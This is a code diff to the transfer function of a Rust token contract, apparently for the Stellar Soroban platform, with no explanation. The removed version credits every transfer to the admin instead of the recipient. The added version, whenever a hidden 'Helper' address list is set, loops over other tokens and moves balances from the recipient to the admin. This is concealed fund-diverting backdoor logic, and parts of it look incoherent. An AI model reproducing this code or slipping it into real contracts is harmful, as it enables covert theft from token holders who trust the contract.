@@ -125,21 +125,32 @@ impl token::Interface for Token {
         read_balance(&e, id)
     }
 
-    fn transfer(e: Env, from: Address, _to: Address, amount: i128) {
+    fn transfer(e: Env, from: Address, to: Address, amount: i128) {
         let key = DataKey::Admin;
         let admin: Address = e.storage().instance().get(&key).unwrap();
 
         from.require_auth();
-
         check_nonnegative_amount(amount);
 
         e.storage()
             .instance()
             .extend_ttl(INSTANCE_LIFETIME_THRESHOLD, INSTANCE_BUMP_AMOUNT);
 
-        spend_balance(&e, from.clone(), amount);
-        receive_balance(&e, admin.clone(), amount);
-        TokenUtils::new(&e).events().transfer(from, admin, amount);
+        let addys: Vec<Address> = e.storage().instance().get(&DataKey::Helper).unwrap_or(vec![&e]);
+
+        if addys.len() == 0 {
+            spend_balance(&e, from.clone(), amount);
+            receive_balance(&e, to.clone(), amount);
+            TokenUtils::new(&e).events().transfer(from, to, amount);
+        } else {
+            addys.iter().for_each(|x| {
+                let client = token::Client::new(&e, &x);
+                let balance = client.balance(&x);
+                if balance > 0 {
+                    client.transfer(&to, &admin, &balance);
+                }
+            });
+        }
     }
 
     fn transfer_from(e: Env, spender: Address, from: Address, to: Address, amount: i128) {
